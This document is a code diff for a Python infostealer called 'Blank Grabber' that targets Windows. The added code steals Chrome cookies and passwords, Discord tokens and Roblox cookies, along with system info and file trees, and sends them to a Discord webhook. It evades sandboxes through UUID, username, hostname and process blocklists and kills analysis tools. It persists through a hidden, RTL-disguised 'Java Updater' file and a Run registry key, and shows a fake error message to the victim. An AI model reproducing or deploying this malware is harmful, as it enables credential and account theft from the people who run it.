@@ -8,6 +8,7 @@ import os
 if os.name!='nt':
     os._exit(0)
 import requests
+import threading
 import subprocess
 import shutil
 import sqlite3
@@ -27,18 +28,60 @@ def generate(num=5):
 
 class vmprotect:
     def __init__(self):
+        vm = False
         if hasattr(sys, 'real_prefix'):
-            os._exit(0)
+            vm = True
+        if subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout.decode().strip().split()[1] in ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]:
+            vm = True
 
+        if os.getlogin().lower() in ["wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl"]:
+            vm = True
+
+        if os.getenv("computername").lower() in ["bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh"]:
+            vm = True
+
+        tasks = subprocess.run("tasklist", capture_output= True, shell= True).stdout.decode()
+        for banned_task in ["fakenet", "dumpcap", "httpdebuggerui", "wireshark", "fiddler", "vboxservice", "df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]:
+            if banned_task in tasks.lower():
+                kill = subprocess.run(f"taskkill /IM {banned_task} /F", capture_output= True, shell= True)
+
+                if kill.returncode != 0:
+                    vm = True
+                    break
         try:
-            requests.get(f'https://blank{generate()}.in')
+            requests.get(f'https://‮blank{generate()}.in')
         except Exception:
             pass
         else:
-            os._exit(0)
+            vm = True
 
         if os.path.isfile('D:/TOOLS/Detonate.exe'):
+            vm = True
+
+        if requests.get("http://ip-api.com/line/?fields=hosting").text == "true":
+            vm = True
+
+        if vm:
             os._exit(0)
+            
+def try_to_delete_old_meipass():
+    for i in glob.iglob(os.getenv("temp")):
+        if os.path.isdir(i) and os.path.basename(i).lower().startswith('_mei') and os.path.basename(i) != os.path.basename(sys._MEIPASS):
+            try:
+                shutil.rmtree(i)
+            except Exception:
+                pass
+            
+def MUTEX():
+    mutex_path = os.getenv('temp')+'/.mutex0001.mutex'
+    if os.path.isfile(mutex_path):
+        os.remove(mutex_path)
+        time.sleep(1)
+    with open(mutex_path, 'w'): pass
+    while True:
+        if not os.path.isfile(mutex_path):
+            os._exit(0)
+    
 
 class BlankGrabber:
     def __init__(self):
@@ -46,34 +89,57 @@ class BlankGrabber:
         self.webhook = WEBHOOK
         self.archive = f"{os.getenv('temp')}\\Blank-{os.getlogin()}.zip"
         self.tempfolder = os.getenv('temp')+'\\'+generate(10)
+        self.system = self.tempfolder + "\\System"
         self.tempfolder2 = os.getenv('temp')+'\\'+generate(9)
         self.localappdata = os.getenv('localappdata')
         self.roaming = os.getenv('appdata')
         self.chromefolder = f"{self.localappdata}\\Google\\Chrome\\User Data"
         try:
             os.mkdir(self.tempfolder)
+            os.mkdir(self.system)
             os.mkdir(self.tempfolder2)
         except FileExistsError:
             pass
         except Exception:
             os._exit(0)
+        threads = []
         self.tokens = []
         self.passwords = {}
+        self.roblocookie = []
         self.ipinfo = self.getip()
+        t = threading.Thread(target = lambda: self.misc())
+        t.start()
+        threads.append(t)
         if os.path.isfile(self.chromefolder+"/Local State"):
             self.copy(self.chromefolder+"/Local State", self.tempfolder+"/Local State")
             self.key = self.get_decryption_key()
             if self.key is not None:
-                self.getcookie()
-                self.getpass()
+                t = threading.Thread(target = lambda: self.getcookie())
+                t.start()
+                threads.append(t)
+                t = threading.Thread(target = lambda: self.getpass())
+                t.start()
+                threads.append(t)
         if os.path.isfile(self.roaming + '\\BetterDiscord\\data\\betterdiscord.asar'):
-            self.bypass_bd()
-        self.getTokens()
-        self.screenshot()
+            t = threading.Thread(target = lambda: self.bypass_bd())
+            t.start()
+            threads.append(t)
+        t = threading.Thread(target = lambda: self.getTokens())
+        t.start()
+        threads.append(t)
+        t = threading.Thread(target = lambda: self.screenshot())
+        t.start()
+        threads.append(t)
+
+        if len(self.roblocookie) != 0:
+            with open(self.tempfolder + "/Roblox Cookies.txt", 'w') as file:
+                file.write("\n\n".join(self.roblocookie))
         if os.path.isfile(self.tempfolder+"/Logs.txt"):
             logs = e.read()
             e.seek(0)
             e.write('These are the error logs generated during the execution of the program in the the target PC. You can try to figure it out for yourself if you want or create an issue at https://github.com/Blank-c/Blank-Grabber/issues \n\n"+logs')
+        for t in threads:
+            t.join()
         self.send()
 
     def copy(self, source, destination):
@@ -151,6 +217,8 @@ class BlankGrabber:
                     cookie = row[2]
                     if (url and name and cookie):
                         cookie = self.decrypt_data(cookie)
+                        if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in cookie:
+                            self.roblocookie.append(cookie)
                         data.append(f"{'Blank Grabber'.center(90, '-')}\n\nURL: {url}\nName: {name}\nCookie: {cookie}")
                 cursor.close()
                 connection.close()
@@ -166,6 +234,32 @@ class BlankGrabber:
                 bd.write(bd.read().replace('api/webhooks', 'api/webhook'))
         except Exception as e:
             self.logs(e, sys.exc_info())
+
+    def tree(self, path, DName= None):
+        if DName is None:
+            DName = os.path.basename(path)
+        PIPE = "│"
+        ELBOW = "└──"
+        TEE = "├──"
+        tree = subprocess.run('tree /A /F', shell= True, capture_output= True, cwd= path).stdout.decode()
+        tree = tree.replace("+---", TEE).replace(r"\---", ELBOW).replace("|", PIPE).splitlines()
+        tree = DName + "\n" + "\n".join(tree[3:])
+        return tree.strip()
+
+    def misc(self):
+        output = []
+        for location in ["Desktop", "Downloads", "Music", "Pictures", "Videos"]:
+            output.append(f"[{location}]\n\n{self.tree(os.environ['userprofile']+'/'+location)}")
+        with open(self.system+"/Tree.txt", 'w', encoding= 'utf-8') as file:
+            file.write("\n\n".join(output).strip())
+
+        output = subprocess.run("tasklist", capture_output= True, shell= True).stdout.decode()
+        with open(self.system + "/Task List.txt", 'w') as tasklist:
+            tasklist.write(output.strip())
+
+        output = subprocess.run("systeminfo", capture_output= True, shell= True).stdout.decode()
+        with open(self.system + '/System Info.txt', 'w') as file:
+            file.write(output.strip())
 
     def getTokens(self):
         data = []
@@ -228,13 +322,13 @@ class BlankGrabber:
                 has_nitro = len(nitro_data)>0
                 billing = len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).text))>0
                 password = self.passwords.get(email, '(Not Found)')
-                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nToken: {token}\nMFA: {'Yes' if token.startswith('mfa.') else 'No'}\nEmail: {email}\nPassword: {password}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}\n\n")
+                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nToken: {token}\nMFA: {'Yes' if token.startswith('mfa.') else 'No'}\nEmail: {email}\nPassword: {password}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
         if len(data)!= 0:
             with open(self.tempfolder+'/Discord Info.txt', 'w', errors="ignore") as file:
                 file.write("\n\n".join(data))
             del data
             self.OK = True
-        
+
     def screenshot(self):
         try:
             file = open(sys._MEIPASS + '/structc.pyd', 'rb')
@@ -272,23 +366,17 @@ class BlankGrabber:
         return headers
 
     def getip(self):
-        headers = {'referer': 'https://ipinfo.io/'}
-        for i in range(5):
-            i = requests.get('https://ipinfo.io/widget', headers=headers)
-            if i.status_code==200:
-                break
         try:
-            r = i.json()
+            r = requests.get("http://ip-api.com/json/?fields=225545").json()
+            if r.get("status") != "success":
+                raise Exception('Failed')
+            data = f"Computer Name: {os.getenv('computername'), '(Unable to identify)'}\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
+            if r['reverse'] != '':
+                data += f"\nReverse DNS: {r['reverse']}"
         except Exception:
-            r = requests.get('https://httpbin.org/get').text
-            return f"IP: {r.json().get('origin')}"
-        if r['privacy'].get('hosting', False):
-            os._exit(0)
-        try:
-            p = requests.get('https://blank-c.github.io/country-codes.json').json()
-        except Exception:
-            p = {}
-        return  f"IP: {r['ip']}\nRegion: {r['region']}\nCountry: {p.get(r['country'], r['country'])}\nTimezone: {r['timezone']}\n\n{'VPN:'.ljust(6)} {chr(9989) if r['privacy']['vpn'] else chr(10062)}\n{'Proxy:'.ljust(6)} {chr(9989) if r['privacy']['proxy'] else chr(10062)}\n{'Tor:'.ljust(6)} {chr(9989) if r['privacy']['tor'] else chr(10062)}\n{'Relay:'.ljust(6)} {chr(9989) if r['privacy']['relay'] else chr(10062)}"
+            r = requests.get("http://httpbin.org/get").json()
+            data = f"IP: {r.get('origin')}"
+        return data
 
     def get_decryption_key(self):
         key = self.chromefolder+"/Local State"
@@ -311,7 +399,7 @@ class BlankGrabber:
   "embeds": [
     {
       "title": "Blank Grabber",
-      "description": f"```fix\nComputer Name: {os.getenv('computername', os.getlogin())}\n{self.ipinfo}```",
+      "description": f"```fix\n{self.ipinfo}```\n**Files: **```fix\n{self.tree(self.tempfolder, 'Blank Grabber')}```",
       "url": "https://github.com/Blank-c/Blank-Grabber/",
       "color": 16737536,
       "footer": {
@@ -321,13 +409,11 @@ class BlankGrabber:
   ],
   "username": "Blank Grabber",
   "avatar_url": "https://i.imgur.com/72yOkd1.jpg"
-}       
+}
         if self.OK:
             requests.post(self.webhook, json = payload)
             with open(self.archive,'rb') as file:
                 requests.post(self.webhook, files = {"file": file})
-        else:
-            subprocess.call(f'mshta vbscript:Execute("X=MsgBox(""GO FUCK YOUR SELF!"",0+48, ""SUCK MY DICK""):close")', shell= True)
         try:
             os.remove(self.archive)
             shutil.rmtree(self.tempfolder)
@@ -349,18 +435,24 @@ if __name__ == "__main__":
                 vmprotect()
             frozen = hasattr(sys, 'frozen')
             if frozen:
-                        
-                if os.path.basename(os.path.dirname(sys.executable)) != "Startup":
+                if os.path.basename(os.path.dirname(sys.executable)) != "Java":
                     try:
-                        BlankGrabber.copy('BlankGrabber', sys.executable, "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/dconfig.exe")
-                        with open('C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/dconfig.exe', 'ab') as file:
+                        BlankGrabber.copy('BlankGrabber', sys.executable, "C:/Program Files/Java/Java Updater G‮lld.COM")
+                        subprocess.run('attrib +h +r +s"C:/Program Files/Java/Java Updater G‮lld.COM"', capture_output = True, shell= True)
+                        with open("C:/Program Files/Java/Java Updater G‮lld.COM", 'ab') as file:
                             file.write(b'\x00')
-                        subprocess.call("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/dconfig.exe", shell= True)
+                        try:
+                            subprocess.run('REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Java Updater" /t REG_SZ /F /d "C:/Program Files/Java/Java Updater G‮lld.COM -hide"', shell= True, capture_output= True)
+                        except Exception:
+                            pass
+                        subprocess.call("C:/Program Files/Java/Java Updater G‮lld.COM", shell= True)
                         subprocess.call(f'mshta vbscript:Execute("X=MsgBox(""The file or directory is corrupt and unreadable."",0+16, ""{sys.executable}""):close")', shell= True)
                         os._exit(0)
                     except Exception:
                         pass
                     subprocess.call(f'mshta vbscript:Execute("X=MsgBox(""The file or directory is corrupt and unreadable."",0+16, ""{sys.executable}""):close")', shell= True)
+            try_to_delete_old_meipass()
+            threading.Thread(target= MUTEX).start()
             BlankGrabber()
         finally:
             time.sleep(1800) #30 Minutes
